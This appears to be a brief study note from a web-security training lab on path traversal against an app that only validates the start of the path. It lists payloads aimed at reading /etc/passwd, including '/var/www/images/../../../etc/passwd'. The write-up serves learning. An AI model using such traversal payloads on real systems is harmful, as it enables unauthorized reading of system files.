@@ -1,0 +1,15 @@
+Lab #5 - File path traversal, validation of start of path
+
+Target Goal - Retrieve the contents of the /etc/passwd file.
+
+Analysis:
+
+the required start folder by the app:
+/var/www/images/
+
+payloads:
+
+/var/www/images/etc/passwd
+
+/var/www/images/../../../etc/passwd
+
